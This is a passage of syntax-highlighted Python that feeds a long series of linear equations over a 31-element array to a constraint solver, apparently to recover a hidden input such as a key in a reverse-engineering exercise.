class="number">55</span> * v4[<span class="number">25</span>]+ <span class="number">328</span> * v4[<span class="number">24</span>]+ <span class="number">246</span> * v4[<span class="number">23</span>]+ <span class="number">362</span> * v4[<span class="number">22</span>]+ <span class="number">86</span> * v4[<span class="number">21</span>]+ <span class="number">75</span> * v4[<span class="number">20</span>]+ <span class="number">142</span> * v4[<span class="number">17</span>]+ <span class="number">244</span> * v4[<span class="number">16</span>]+ <span class="number">216</span> * v4[<span class="number">15</span>]+ <span class="number">281</span> * v4[<span class="number">14</span>]+ <span class="number">398</span> * v4[<span class="number">13</span>]+ <span class="number">322</span> * v4[<span class="number">12</span>]+ <span class="number">251</span> * v4[<span class="number">11</span>]+ <span class="number">357</span> * v4[<span class="number">8</span>]+ <span class="number">76</span> * v4[<span class="number">7</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">389</span> * v4[<span class="number">5</span>]+ <span class="number">275</span> * v4[<span class="number">4</span>]+ <span class="number">312</span> * v4[<span class="number">3</span>]+ <span class="number">200</span> * v4[<span class="number">2</span>]+ <span class="number">110</span> * v4[<span class="number">1</span>]+ <span class="number">203</span> * v4[<span class="number">0</span>]+ <span class="number">99</span> * v4[<span class="number">9</span>]+ <span class="number">21</span> * v4[<span class="number">10</span>]+ <span class="number">269</span> * v4[<span class="number">18</span>]+ <span class="number">33</span> * v4[<span class="number">19</span>]+ <span class="number">356</span> * v4[<span class="number">30</span>] == <span class="number">631652</span>)</span><br><span class="line">s.add(<span class="number">261</span> * v4[<span class="number">29</span>]+ <span class="number">189</span> * v4[<span class="number">26</span>]+ <span class="number">55</span> * v4[<span class="number">25</span>]+ <span class="number">23</span> * v4[<span class="number">24</span>]+ <span class="number">202</span> * v4[<span class="number">23</span>]+ <span class="number">185</span> * v4[<span class="number">22</span>]+ <span class="number">182</span> * v4[<span class="number">21</span>]+ <span class="number">285</span> * v4[<span class="number">20</span>]+ <span class="number">217</span> * v4[<span class="number">17</span>]+ <span class="number">157</span> * v4[<span class="number">16</span>]+ <span class="number">232</span> * v4[<span class="number">15</span>]+ <span class="number">132</span> * v4[<span class="number">14</span>]+ <span class="number">169</span> * v4[<span class="number">13</span>]+ <span class="number">154</span> * v4[<span class="number">12</span>]+ <span class="number">121</span> * v4[<span class="number">11</span>]+ <span class="number">389</span> * v4[<span class="number">10</span>]+ <span class="number">376</span> * v4[<span class="number">9</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">225</span> * v4[<span class="number">5</span>]+ <span class="number">155</span> * v4[<span class="number">4</span>]+ <span class="number">234</span> * v4[<span class="number">3</span>]+ <span class="number">149</span> * v4[<span class="number">2</span>]+ <span class="number">241</span> * v4[<span class="number">1</span>]+ <span class="number">312</span> * v4[<span class="number">0</span>]+ <span class="number">368</span> * v4[<span class="number">7</span>]+ <span class="number">129</span> * v4[<span class="number">8</span>]+ <span class="number">226</span> * v4[<span class="number">18</span>]+ <span class="number">288</span> * v4[<span class="number">19</span>]+ <span class="number">201</span> * v4[<span class="number">27</span>]+ <span class="number">288</span> * v4[<span class="number">28</span>]+ <span class="number">69</span> * v4[<span class="number">30</span>] == <span class="number">614840</span>)</span><br><span class="line">s.add(<span class="number">60</span> * v4[<span class="number">29</span>]+ <span class="number">118</span> * v4[<span class="number">28</span>]+ <span class="number">153</span> * v4[<span class="number">27</span>]+ <span class="number">139</span> * v4[<span class="number">26</span>]+ <span class="number">23</span> * v4[<span class="number">25</span>]+ <span class="number">279</span> * v4[<span class="number">24</span>]+ <span class="number">396</span> * v4[<span class="number">23</span>]+ <span class="number">287</span> * v4[<span class="number">22</span>]+ <span class="number">237</span> * v4[<span class="number">19</span>]+ <span class="number">266</span> * v4[<span class="number">18</span>]+ <span class="number">149</span> * v4[<span class="number">17</span>]+ <span class="number">193</span> * v4[<span class="number">16</span>]+ <span class="number">395</span> * v4[<span class="number">15</span>]+ <span class="number">97</span> * v4[<span class="number">14</span>]+ <span class="number">16</span> * v4[<span class="number">13</span>]+ <span class="number">286</span> * v4[<span class="number">12</span>]+ <span class="number">105</span> * v4[<span class="number">11</span>]+ <span class="number">88</span> * v4[<span class="number">10</span>]+ <span class="number">282</span> * v4[<span class="number">9</span>]+ <span class="number">55</span> * v4[<span class="number">8</span>]+ <span class="number">134</span> * v4[<span class="number">7</span>]+ <span class="number">114</span> * v4[<span class="number">6</span>]+ <span class="number">101</span> * v4[<span class="number">5</span>]+ <span class="number">116</span> * v4[<span class="number">4</span>]+ <span class="number">271</span> * v4[<span class="number">3</span>]+ <span class="number">186</span> * v4[<span class="number">2</span>]+ <span class="number">263</span> * v4[<span class="number">1</span>]+ <span class="number">313</span> * v4[<span class="number">0</span>]+ <span class="number">149</span> * v4[<span class="number">20</span>]+ <span class="number">129</span> * v4[<span class="number">21</span>]+ <span class="number">145</span> * v4[<span class="number">30</span>] == <span class="number">510398</span>)</span><br><span class="line">s.add(<span class="number">385</span> * v4[<span class="number">29</span>]+ <span class="number">53</span> * v4[<span class="number">28</span>]+ <span class="number">112</span> * v4[<span class="number">27</span>]+ <span class="number">8</span> * v4[<span class="number">26</span>]+ <span class="number">232</span> * v4[<span class="number">25</span>]+ <span class="number">145</span> * v4[<span class="number">24</span>]+ <span class="number">313</span> * v4[<span class="number">23</span>]+ <span class="number">156</span> * v4[<span class="number">22</span>]+ <span class="number">321</span> * v4[<span class="number">21</span>]+ <span class="number">358</span> * v4[<span class="number">20</span>]+ <span class="number">46</span> * v4[<span class="number">19</span>]+ <span class="number">382</span> * v4[<span class="number">18</span>]+ <span class="number">144</span> * v4[<span class="number">16</span>]+ <span class="number">222</span> * v4[<span class="number">14</span>]+ <span class="number">329</span> * v4[<span class="number">13</span>]+ <span class="number">161</span> * v4[<span class="number">12</span>]+ <span class="number">335</span> * v4[<span class="number">11</span>]+ <span class="number">50</span> * v4[<span class="number">10</span>]+ <span class="number">373</span> * v4[<span class="number">9</span>]+ <span class="number">66</span> * v4[<span class="number">8</span>]+ <span class="number">44</span> * v4[<span class="number">7</span>]+ <span class="number">59</span> * v4[<span class="number">6</span>]+ <span class="number">292</span> * v4[<span class="number">5</span>]+ <span class="number">39</span> * v4[<span class="number">4</span>]+ <span class="number">53</span> * v4[<span class="number">3</span>]+ <span class="number">310</span> * v4[<span class="number">0</span>]+ <span class="number">154</span> * v4[<span class="number">1</span>]+ <span class="number">24</span> * v4[<span class="number">2</span>]+ <span class="number">396</span> * v4[<span class="number">15</span>]+ <span class="number">81</span> * v4[<span class="number">17</span>]+ <span class="number">355</span> * v4[<span class="number">30</span>] == <span class="number">558740</span>)</span><br><span class="line">s.add(<span class="number">249</span> * v4[<span class="number">29</span>]+ <span class="number">386</span> * v4[<span class="number">28</span>]+ <span class="number">313</span> * v4[<span class="number">27</span>]+ <span class="number">74</span> * v4[<span class="number">26</span>]+ <span class="number">22</span> * v4[<span class="number">25</span>]+ <span class="number">168</span> * v4[<span class="number">24</span>]+ <span class="number">305</span> * v4[<span class="number">21</span>]+ <span class="number">358</span> * v4[<span class="number">20</span>]+ <span class="number">191</span> * v4[<span class="number">19</span>]+ <span class="number">202</span> * v4[<span class="number">18</span>]+ <span class="number">14</span> * v4[<span class="number">15</span>]+ <span class="number">114</span> * v4[<span class="number">14</span>]+ <span class="number">224</span> * v4[<span class="number">13</span>]+ <span class="number">134</span> * v4[<span class="number">12</span>]+ <span class="number">274</span> * v4[<span class="number">11</span>]+ <span class="number">372</span> * v4[<span class="number">10</span>]+ <span class="number">159</span> * v4[<span class="number">9</span>]+ <span class="number">233</span> * v4[<span class="number">8</span>]+ <span class="number">70</span> * v4[<span class="number">7</span>]+ <span class="number">287</span> * v4[<span class="number">6</span>]+ <span class="number">297</span> * v4[<span class="number">5</span>]+ <span class="number">318</span> * v4[<span class="number">4</span>]+ <span class="number">177</span> * v4[<span class="number">3</span>]+ <span class="number">173</span> * v4[<span class="number">2</span>]+ <span class="number">270</span> * v4[<span class="number">1</span>]+ <span class="number">163</span> * v4[<span class="number">0</span>]+ <span class="number">77</span> * v4[<span class="number">16</span>]+ <span class="number">25</span> * v4[<span class="number">17</span>]+ <span class="number">387</span> * v4[<span class="number">22</span>]+ <span class="number">18</span> * v4[<span class="number">23</span>]+ <span class="number">345</span> * v4[<span class="number">30</span>] == <span class="number">592365</span>)</span><br><span class="line">s.add(<span class="number">392</span> * v4[<span class="number">29</span>]+ <span class="number">385</span> * v4[<span class="number">28</span>]+ <span class="number">302</span> * v4[<span class="number">27</span>]+ <span class="number">13</span> * v4[<span class="number">25</span>]+ <span class="number">27</span> * v4[<span class="number">24</span>]+ <span class="number">99</span> * v4[<span class="number">22</span>]+ <span class="number">343</span> * v4[<span class="number">19</span>]+ <span class="number">324</span> * v4[<span class="number">18</span>]+ <span class="number">223</span> * v4[<span class="number">17</span>]+ <span class="number">372</span> * v4[<span class="number">16</span>]+ <span class="number">261</span> * v4[<span class="number">15</span>]+ <span class="number">181</span> * v4[<span class="number">14</span>]+ <span class="number">203</span> * v4[<span class="number">13</span>]+ <span class="number">232</span> * v4[<span class="number">12</span>]+ <span class="number">305</span> * v4[<span class="number">11</span>]+ <span class="number">393</span> * v4[<span class="number">10</span>]+ <span class="number">325</span> * v4[<span class="number">9</span>]+ <span class="number">231</span> * v4[<span class="number">8</span>]+ <span class="number">92</span> * v4[<span class="number">7</span>]+ <span class="number">142</span> * v4[<span class="number">6</span>]+ <span class="number">22</span> * v4[<span class="number">5</span>]+ <span class="number">86</span> * v4[<span class="number">4</span>]+ <span class="number">264</span> * v4[<span class="number">3</span>]+ <span class="number">300</span> * v4[<span class="number">2</span>]+ <span class="number">387</span> * v4[<span class="number">1</span>]+ <span class="number">360</span> * v4[<span class="number">0</span>]+ <span class="number">225</span> * v4[<span class="number">20</span>]+ <span class="number">127</span> * v4[<span class="number">21</span>]+ <span class="number">2</span> * v4[<span class="number">23</span>]+ <span class="number">80</span> * v4[<span class="number">26</span>]+ <span class="number">268</span> * v4[<span class="number">30</span>] == <span class="number">619574</span>)</span><br><span class="line">s.add(<span class="number">270</span> * v4[<span class="number">28</span>]+ <span class="number">370</span> * v4[<span class="number">27</span>]+ <span class="number">235</span> * v4[<span class="number">26</span>]+ <span class="number">96</span> * v4[<span class="number">22</span>]+ <span class="number">85</span> * v4[<span class="number">20</span>]+ <span class="number">150</span> * v4[<span class="number">19</span>]+ <span class="number">140</span> * v4[<span class="number">18</span>]+ <span class="number">94</span> * v4[<span class="number">17</span>]+ <span class="number">295</span> * v4[<span class="number">16</span>]+ <span class="number">19</span> * v4[<span class="number">14</span>]+ <span class="number">176</span> * v4[<span class="number">12</span>]+ <span class="number">94</span> * v4[<span class="number">11</span>]+ <span class="number">258</span> * v4[<span class="number">10</span>]+ <span class="number">302</span> * v4[<span class="number">9</span>]+ <span class="number">171</span> * v4[<span class="number">8</span>]+ <span class="number">66</span> * v4[<span class="number">7</span>]+ <span class="number">278</span> * v4[<span class="number">6</span>]+ <span class="number">193</span> * v4[<span class="number">5</span>]+ <span class="number">251</span> * v4[<span class="number">4</span>]+ <span class="number">284</span> * v4[<span class="number">3</span>]+ <span class="number">218</span> * v4[<span class="number">2</span>]+ (v4[<span class="number">1</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">319</span> * v4[<span class="number">0</span>]+ <span class="number">125</span> * v4[<span class="number">13</span>]+ <span class="number">24</span> * v4[<span class="number">15</span>]+ <span class="number">267</span> * v4[<span class="number">21</span>]+ <span class="number">160</span> * v4[<span class="number">23</span>]+ <span class="number">111</span> * v4[<span class="number">24</span>]+ <span class="number">33</span> * v4[<span class="number">25</span>]+ <span class="number">174</span> * v4[<span class="number">29</span>]+ <span class="number">13</span> * v4[<span class="number">30</span>] == <span class="number">480557</span>)</span><br><span class="line">s.add(<span class="number">87</span> * v4[<span class="number">28</span>]+ <span class="number">260</span> * v4[<span class="number">27</span>]+ <span class="number">326</span> * v4[<span class="number">26</span>]+ <span class="number">210</span> * v4[<span class="number">25</span>]+ <span class="number">357</span> * v4[<span class="number">24</span>]+ <span class="number">170</span> * v4[<span class="number">23</span>]+ <span class="number">315</span> * v4[<span class="number">22</span>]+ <span class="number">376</span> * v4[<span class="number">21</span>]+ <span class="number">227</span> * v4[<span class="number">20</span>]+ <span class="number">43</span> * v4[<span class="number">19</span>]+ <span class="number">358</span> * v4[<span class="number">18</span>]+ <span class="number">364</span> * v4[<span class="number">17</span>]+ <span class="number">309</span> * v4[<span class="number">16</span>]+ <span class="number">282</span> * v4[<span class="number">15</span>]+ <span class="number">286</span> * v4[<span class="number">14</span>]+ <span class="number">365</span> * v4[<span class="number">13</span>]+ <span class="number">287</span> * v4[<span class="number">12</span>]+ <span class="number">377</span> * v4[<span class="number">11</span>]+ <span class="number">74</span> * v4[<span class="number">10</span>]+ <span class="number">225</span> * v4[<span class="number">9</span>]+ <span class="number">328</span> * v4[<span class="number">6</span>]+ <span class="number">223</span> * v4[<span class="number">5</span>]+ <span class="number">120</span> * v4[<span class="number">4</span>]+ <span class="number">102</span> * v4[<span class="number">3</span>]+ <span class="number">162</span> * v4[<span class="number">2</span>]+ <span class="number">123</span> * v4[<span class="number">1</span>]+ <span class="number">196</span> * v4[<span class="number">0</span>]+ <span class="number">29</span> * v4[<span class="number">7</span>]+ <span class="number">27</span> * v4[<span class="number">8</span>]+ <span class="number">352</span> * v4[<span class="number">30</span>] == <span class="number">666967</span>)</span><br><span class="line">s.add(<span class="number">61</span> * v4[<span class="number">29</span>]+ <span class="number">195</span> * v4[<span class="number">28</span>]+ <span class="number">125</span> * v4[<span class="number">27</span>]+ (v4[<span class="number">26</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">260</span> * v4[<span class="number">25</span>]+ <span class="number">202</span> * v4[<span class="number">24</span>]+ <span class="number">116</span> * v4[<span class="number">23</span>]+ <span class="number">230</span> * v4[<span class="number">22</span>]+ <span class="number">326</span> * v4[<span class="number">21</span>]+ <span class="number">211</span> * v4[<span class="number">20</span>]+ <span class="number">371</span> * v4[<span class="number">19</span>]+ <span class="number">353</span> * v4[<span class="number">16</span>]+ <span class="number">124</span> * v4[<span class="number">13</span>]+ <span class="number">188</span> * v4[<span class="number">12</span>]+ <span class="number">163</span> * v4[<span class="number">11</span>]+ <span class="number">140</span> * v4[<span class="number">10</span>]+ <span class="number">51</span> * v4[<span class="number">9</span>]+ <span class="number">262</span> * v4[<span class="number">8</span>]+ <span class="number">229</span> * v4[<span class="number">7</span>]+ <span class="number">100</span> * v4[<span class="number">6</span>]+ <span class="number">113</span> * v4[<span class="number">5</span>]+ <span class="number">158</span> * v4[<span class="number">4</span>]+ <span class="number">378</span> * v4[<span class="number">3</span>]+ <span class="number">365</span> * v4[<span class="number">2</span>]+ <span class="number">207</span> * v4[<span class="number">1</span>]+ <span class="number">277</span> * v4[<span class="number">0</span>]+ <span class="number">190</span> * v4[<span class="number">14</span>]+ <span class="number">320</span> * v4[<span class="number">15</span>]+ <span class="number">347</span> * v4[<span class="number">17</span>]+ <span class="number">11</span> * v4[<span class="number">18</span>]+ <span class="number">137</span> * v4[<span class="number">30</span>] == <span class="number">590534</span>)</span><br><span class="line">s.add(<span class="number">39</span> * v4[<span class="number">28</span>]+ <span class="number">303</span> * v4[<span class="number">27</span>]+ <span class="number">360</span> * v4[<span class="number">26</span>]+ <span class="number">157</span> * v4[<span class="number">25</span>]+ <span class="number">324</span> * v4[<span class="number">24</span>]+ <span class="number">77</span> * v4[<span class="number">23</span>]+ <span class="number">308</span> * v4[<span class="number">22</span>]+ <span class="number">313</span> * v4[<span class="number">21</span>]+ <span class="number">87</span> * v4[<span class="number">20</span>]+ <span class="number">201</span> * v4[<span class="number">19</span>]+ <span class="number">50</span> * v4[<span class="number">18</span>]+ <span class="number">60</span> * v4[<span class="number">17</span>]+ <span class="number">28</span> * v4[<span class="number">16</span>]+ <span class="number">193</span> * v4[<span class="number">15</span>]+ <span class="number">184</span> * v4[<span class="number">14</span>]+ <span class="number">205</span> * v4[<span class="number">13</span>]+ <span class="number">140</span> * v4[<span class="number">12</span>]+ <span class="number">311</span> * v4[<span class="number">11</span>]+ <span class="number">304</span> * v4[<span class="number">10</span>]+ <span class="number">35</span> * v4[<span class="number">9</span>]+ <span class="number">356</span> * v4[<span class="number">8</span>]+ <span class="number">23</span> * v4[<span class="number">5</span>]+ <span class="number">85</span> * v4[<span class="number">4</span>]+ <span class="number">156</span> * v4[<span class="number">3</span>]+ <span class="number">16</span> * v4[<span class="number">2</span>]+ <span class="number">26</span> * v4[<span class="number">1</span>]+ <span class="number">157</span> * v4[<span class="number">0</span>]+ <span class="number">150</span> * v4[<span class="number">6</span>]+ <span class="number">72</span> * v4[<span class="number">7</span>]+ <span class="number">58</span> * v4[<span class="number">29</span>] == <span class="number">429108</span>)</span><br><span class="line">s.add(<span class="number">157</span> * v4[<span class="number">29</span>]+ <span class="number">137</span> * v4[<span class="number">28</span>]+ <span class="number">71</span> * v4[<span class="number">27</span>]+ <span class="number">269</span> * v4[<span class="number">26</span>]+ <span class="number">161</span> * v4[<span class="number">25</span>]+ <span class="number">317</span> * v4[<span class="number">20</span>]+ <span class="number">296</span> * v4[<span class="number">19</span>]+ <span class="number">385</span> * v4[<span class="number">18</span>]+ <span class="number">165</span> * v4[<span class="number">13</span>]+ <span class="number">159</span> * v4[<span class="number">12</span>]+ <span class="number">132</span> * v4[<span class="number">11</span>]+ <span class="number">296</span> * v4[<span class="number">10</span>]+ <span class="number">162</span> * v4[<span class="number">7</span>]+ <span class="number">254</span> * v4[<span class="number">4</span>]+ <span class="number">172</span> * v4[<span class="number">3</span>]+ <span class="number">132</span> * v4[<span class="number">0</span>]+ <span class="number">369</span> * v4[<span class="number">1</span>]+ <span class="number">257</span> * v4[<span class="number">2</span>]+ <span class="number">134</span> * v4[<span class="number">5</span>]+ <span class="number">384</span> * v4[<span class="number">6</span>]+ <span class="number">53</span> * v4[<span class="number">8</span>]+ <span class="number">255</span> * v4[<span class="number">9</span>]+ <span class="number">229</span> * v4[<span class="number">14</span>]+ <span class="number">129</span> * v4[<span class="number">15</span>]+ <span class="number">23</span> * v4[<span class="number">16</span>]+ <span class="number">41</span> * v4[<span class="number">17</span>]+ <span class="number">112</span> * v4[<span class="number">21</span>]+ <span class="number">17</span> * v4[<span class="number">22</span>]+ <span class="number">222</span> * v4[<span class="number">23</span>]+ <span class="number">96</span> * v4[<span class="number">24</span>]+ <span class="number">126</span> * v4[<span class="number">30</span>] == <span class="number">563521</span>)</span><br><span class="line">s.add(<span class="number">207</span> * v4[<span class="number">29</span>]+ <span class="number">83</span> * v4[<span class="number">28</span>]+ <span class="number">111</span> * v4[<span class="number">27</span>]+ <span class="number">35</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">25</span>]+ <span class="number">138</span> * v4[<span class="number">22</span>]+ <span class="number">223</span> * v4[<span class="number">21</span>]+ <span class="number">142</span> * v4[<span class="number">20</span>]+ <span class="number">154</span> * v4[<span class="number">19</span>]+ <span class="number">111</span> * v4[<span class="number">18</span>]+ <span class="number">341</span> * v4[<span class="number">17</span>]+ <span class="number">175</span> * v4[<span class="number">16</span>]+ <span class="number">259</span> * v4[<span class="number">15</span>]+ <span class="number">225</span> * v4[<span class="number">14</span>]+ <span class="number">26</span> * v4[<span class="number">11</span>]+ <span class="number">334</span> * v4[<span class="number">10</span>]+ <span class="number">250</span> * v4[<span class="number">7</span>]+ <span class="number">198</span> * v4[<span class="number">6</span>]+ <span class="number">279</span> * v4[<span class="number">5</span>]+ <span class="number">301</span> * v4[<span class="number">4</span>]+ <span class="number">193</span> * v4[<span class="number">3</span>]+ <span class="number">334</span> * v4[<span class="number">2</span>]+ <span class="number">134</span> * v4[<span class="number">0</span>]+ <span class="number">37</span> * v4[<span class="number">1</span>]+ <span class="number">183</span> * v4[<span class="number">8</span>]+ <span class="number">5</span> * v4[<span class="number">9</span>]+ <span class="number">270</span> * v4[<span class="number">12</span>]+ <span class="number">21</span> * v4[<span class="number">13</span>]+ <span class="number">275</span> * v4[<span class="number">23</span>]+ <span class="number">48</span> * v4[<span class="number">24</span>]+ <span class="number">163</span> * v4[<span class="number">30</span>] == <span class="number">493999</span>)</span><br><span class="line">s.add(<span class="number">393</span> * v4[<span class="number">29</span>]+ <span class="number">176</span> * v4[<span class="number">28</span>]+ <span class="number">105</span> * v4[<span class="number">27</span>]+ <span class="number">162</span> * v4[<span class="number">26</span>]+ <span class="number">148</span> * v4[<span class="number">25</span>]+ <span class="number">281</span> * v4[<span class="number">24</span>]+ <span class="number">300</span> * v4[<span class="number">23</span>]+ <span class="number">342</span> * v4[<span class="number">18</span>]+ <span class="number">262</span> * v4[<span class="number">17</span>]+ <span class="number">152</span> * v4[<span class="number">12</span>]+ <span class="number">43</span> * v4[<span class="number">11</span>]+ <span class="number">296</span> * v4[<span class="number">10</span>]+ <span class="number">273</span> * v4[<span class="number">9</span>]+ <span class="number">75</span> * v4[<span class="number">6</span>]+ <span class="number">18</span> * v4[<span class="number">4</span>]+ <span class="number">217</span> * v4[<span class="number">2</span>]+ <span class="number">132</span> * v4[<span class="number">1</span>]+ <span class="number">112</span> * v4[<span class="number">0</span>]+ <span class="number">210</span> * v4[<span class="number">3</span>]+ <span class="number">72</span> * v4[<span class="number">5</span>]+ <span class="number">113</span> * v4[<span class="number">7</span>]+ <span class="number">40</span> * v4[<span class="number">8</span>]+ <span class="number">278</span> * v4[<span class="number">13</span>]+ <span class="number">24</span> * v4[<span class="number">14</span>]+ <span class="number">77</span> * v4[<span class="number">15</span>]+ <span class="number">11</span> * v4[<span class="number">16</span>]+ <span class="number">55</span> * v4[<span class="number">19</span>]+ <span class="number">255</span> * v4[<span class="number">20</span>]+ <span class="number">241</span> * v4[<span class="number">21</span>]+ <span class="number">13</span> * v4[<span class="number">22</span>]+ <span class="number">356</span> * v4[<span class="number">30</span>] == <span class="number">470065</span>)</span><br><span class="line">s.add(<span class="number">369</span> * v4[<span class="number">29</span>]+ <span class="number">231</span> * v4[<span class="number">28</span>]+ <span class="number">285</span> * v4[<span class="number">25</span>]+ <span class="number">290</span> * v4[<span class="number">24</span>]+ <span class="number">297</span> * v4[<span class="number">23</span>]+ <span class="number">189</span> * v4[<span class="number">22</span>]+ <span class="number">390</span> * v4[<span class="number">21</span>]+ <span class="number">345</span> * v4[<span class="number">20</span>]+ <span class="number">153</span> * v4[<span class="number">19</span>]+ <span class="number">114</span> * v4[<span class="number">18</span>]+ <span class="number">251</span> * v4[<span class="number">17</span>]+ <span class="number">340</span> * v4[<span class="number">16</span>]+ <span class="number">44</span> * v4[<span class="number">15</span>]+ <span class="number">58</span> * v4[<span class="number">14</span>]+ <span class="number">335</span> * v4[<span class="number">13</span>]+ <span class="number">359</span> * v4[<span class="number">12</span>]+ <span class="number">392</span> * v4[<span class="number">11</span>]+ <span class="number">181</span> * v4[<span class="number">8</span>]+ <span class="number">103</span> * v4[<span class="number">7</span>]+ <span class="number">229</span> * v4[<span class="number">6</span>]+ <span class="number">175</span> * v4[<span class="number">5</span>]+ <span class="number">208</span> * v4[<span class="number">4</span>]+ <span class="number">92</span> * v4[<span class="number">3</span>]+ <span class="number">397</span> * v4[<span class="number">2</span>]+ <span class="number">349</span> * v4[<span class="number">1</span>]+ <span class="number">356</span> * v4[<span class="number">0</span>]+ (v4[<span class="number">9</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">5</span> * v4[<span class="number">10</span>]+ <span class="number">88</span> * v4[<span class="number">26</span>]+ <span class="number">40</span> * v4[<span class="number">27</span>]+ <span class="number">295</span> * v4[<span class="number">30</span>] == <span class="number">661276</span>)</span><br><span class="line">s.add(<span class="number">341</span> * v4[<span class="number">27</span>]+ <span class="number">40</span> * v4[<span class="number">25</span>]+ <span class="number">374</span> * v4[<span class="number">23</span>]+ <span class="number">201</span> * v4[<span class="number">22</span>]+ <span class="number">77</span> * v4[<span class="number">21</span>]+ <span class="number">215</span> * v4[<span class="number">20</span>]+ <span class="number">283</span> * v4[<span class="number">19</span>]+ <span class="number">213</span> * v4[<span class="number">18</span>]+ <span class="number">392</span> * v4[<span class="number">17</span>]+ <span class="number">224</span> * v4[<span class="number">16</span>]+ v4[<span class="number">15</span>]+ <span class="number">270</span> * v4[<span class="number">12</span>]+ <span class="number">28</span> * v4[<span class="number">11</span>]+ <span class="number">75</span> * v4[<span class="number">8</span>]+ <span class="number">386</span> * v4[<span class="number">7</span>]+ <span class="number">298</span> * v4[<span class="number">6</span>]+ <span class="number">170</span> * v4[<span class="number">5</span>]+ <span class="number">287</span> * v4[<span class="number">4</span>]+ <span class="number">247</span> * v4[<span class="number">3</span>]+ <span class="number">204</span> * v4[<span class="number">2</span>]+ <span class="number">103</span> * v4[<span class="number">1</span>]+ <span class="number">21</span> * v4[<span class="number">0</span>]+ <span class="number">84</span> * v4[<span class="number">9</span>]+ <span class="number">27</span> * v4[<span class="number">10</span>]+ <span class="number">159</span> * v4[<span class="number">13</span>]+ <span class="number">192</span> * v4[<span class="number">14</span>]+ <span class="number">213</span> * v4[<span class="number">24</span>]+ <span class="number">129</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">28</span>]+ <span class="number">27</span> * v4[<span class="number">29</span>]+ <span class="number">361</span> * v4[<span class="number">30</span>] == <span class="number">555288</span>)</span><br><span class="line">s.add(<span class="number">106</span> * v4[<span class="number">29</span>]+ <span class="number">363</span> * v4[<span class="number">28</span>]+ <span class="number">210</span> * v4[<span class="number">27</span>]+ <span class="number">171</span> * v4[<span class="number">26</span>]+ <span class="number">289</span> * v4[<span class="number">25</span>]+ <span class="number">240</span> * v4[<span class="number">24</span>]+ <span class="number">164</span> * v4[<span class="number">23</span>]+ <span class="number">342</span> * v4[<span class="number">22</span>]+ <span class="number">391</span> * v4[<span class="number">19</span>]+ <span class="number">304</span> * v4[<span class="number">18</span>]+ <span class="number">218</span> * v4[<span class="number">17</span>]+ <span class="number">32</span> * v4[<span class="number">16</span>]+ <span class="number">350</span> * v4[<span class="number">15</span>]+ <span class="number">339</span> * v4[<span class="number">12</span>]+ <span class="number">303</span> * v4[<span class="number">11</span>]+ <span class="number">222</span> * v4[<span class="number">10</span>]+ <span class="number">298</span> * v4[<span class="number">9</span>]+ <span class="number">47</span> * v4[<span class="number">8</span>]+ <span class="number">48</span> * v4[<span class="number">6</span>]+ <span class="number">264</span> * v4[<span class="number">4</span>]+ <span class="number">113</span> * v4[<span class="number">3</span>]+ <span class="number">275</span> * v4[<span class="number">2</span>]+ <span class="number">345</span> * v4[<span class="number">1</span>]+ <span class="number">312</span> * v4[<span class="number">0</span>]+ <span class="number">171</span> * v4[<span class="number">5</span>]+ <span class="number">384</span> * v4[<span class="number">7</span>]+ <span class="number">175</span> * v4[<span class="number">13</span>]+ <span class="number">5</span> * v4[<span class="number">14</span>]+ <span class="number">113</span> * v4[<span class="number">20</span>]+ <span class="number">19</span> * v4[<span class="number">21</span>]+ <span class="number">263</span> * v4[<span class="number">30</span>] == <span class="number">637650</span>)</span><br><span class="line">s.add(<span class="number">278</span> * v4[<span class="number">29</span>]+ <span class="number">169</span> * v4[<span class="number">28</span>]+ <span class="number">62</span> * v4[<span class="number">27</span>]+ <span class="number">119</span> * v4[<span class="number">26</span>]+ <span class="number">385</span> * v4[<span class="number">25</span>]+ <span class="number">289</span> * v4[<span class="number">24</span>]+ <span class="number">344</span> * v4[<span class="number">23</span>]+ <span class="number">45</span> * v4[<span class="number">20</span>]+ <span class="number">308</span> * v4[<span class="number">19</span>]+ <span class="number">318</span> * v4[<span class="number">18</span>]+ <span class="number">270</span> * v4[<span class="number">17</span>]+ v4[<span class="number">16</span>]+ <span class="number">323</span> * v4[<span class="number">15</span>]+ <span class="number">332</span> * v4[<span class="number">14</span>]+ <span class="number">287</span> * v4[<span class="number">11</span>]+ <span class="number">170</span> * v4[<span class="number">10</span>]+ <span class="number">163</span> * v4[<span class="number">9</span>]+ <span class="number">301</span> * v4[<span class="number">8</span>]+ <span class="number">303</span> * v4[<span class="number">7</span>]+ <span class="number">23</span> * v4[<span class="number">6</span>]+ <span class="number">327</span> * v4[<span class="number">5</span>]+ <span class="number">169</span> * v4[<span class="number">3</span>]+ <span class="number">28</span> * v4[<span class="number">0</span>]+ <span class="number">365</span> * v4[<span class="number">1</span>]+ <span class="number">15</span> * v4[<span class="number">2</span>]+ <span class="number">352</span> * v4[<span class="number">12</span>]+ <span class="number">72</span> * v4[<span class="number">13</span>]+ <span class="number">140</span> * v4[<span class="number">21</span>]+ <span class="number">65</span> * v4[<span class="number">22</span>]+ <span class="number">346</span> * v4[<span class="number">30</span>] == <span class="number">572609</span>)</span><br><span class="line">s.add(<span class="number">147</span> * v4[<span class="number">29</span>]+ <span class="number">88</span> * v4[<span class="number">28</span>]+ <span class="number">143</span> * v4[<span class="number">27</span>]+ <span class="number">237</span> * v4[<span class="number">26</span>]+ <span class="number">63</span> * v4[<span class="number">24</span>]+ <span class="number">281</span> * v4[<span class="number">22</span>]+ <span class="number">388</span> * v4[<span class="number">21</span>]+ <span class="number">142</span> * v4[<span class="number">20</span>]+ <span class="number">208</span> * v4[<span class="number">19</span>]+ <span class="number">60</span> * v4[<span class="number">18</span>]+ <span class="number">354</span> * v4[<span class="number">15</span>]+ <span class="number">88</span> * v4[<span class="number">14</span>]+ <span class="number">146</span> * v4[<span class="number">13</span>]+ <span class="number">290</span> * v4[<span class="number">12</span>]+ <span class="number">349</span> * v4[<span class="number">11</span>]+ <span class="number">43</span> * v4[<span class="number">10</span>]+ <span class="number">230</span> * v4[<span class="number">9</span>]+ <span class="number">267</span> * v4[<span class="number">6</span>]+ <span class="number">136</span> * v4[<span class="number">5</span>]+ <span 